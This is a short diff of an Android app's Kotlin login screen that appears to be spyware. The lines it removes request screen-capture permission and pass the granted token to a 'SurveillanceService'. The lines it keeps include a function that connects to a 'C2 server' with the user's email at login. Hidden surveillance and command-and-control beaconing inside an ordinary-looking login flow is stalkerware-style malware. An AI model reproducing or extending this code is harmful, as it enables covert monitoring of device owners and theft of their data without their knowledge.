@@ -98,33 +98,11 @@ class LoginActivity : AppCompatActivity() {
                 .addOnCompleteListener {
                     progressBar.visibility = ProgressBar.GONE
                 }
-        }
-        requestScreenCapturePermission()
-
-    }
-    private val REQUEST_MEDIA_PROJECTION = 1
-
-    private fun requestScreenCapturePermission() {
-        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
+            }
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-
-        if (requestCode == REQUEST_MEDIA_PROJECTION) {
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                // Store permission
-                val intent = Intent(this, SurveillanceService::class.java)
-                intent.action = "SETUP_PROJECTION"
-                intent.putExtra("resultCode", resultCode)
-                intent.putExtra("data", data)
-                startService(intent)
-            } else {
-                // Permission denied
-                Log.e("MainActivity", "Screen capture permission denied")
-            }
-        }
     }
     private fun connectToC2Server(userEmail: String) {
         Log.d("C2Connection", "Connecting to C2 server on login")
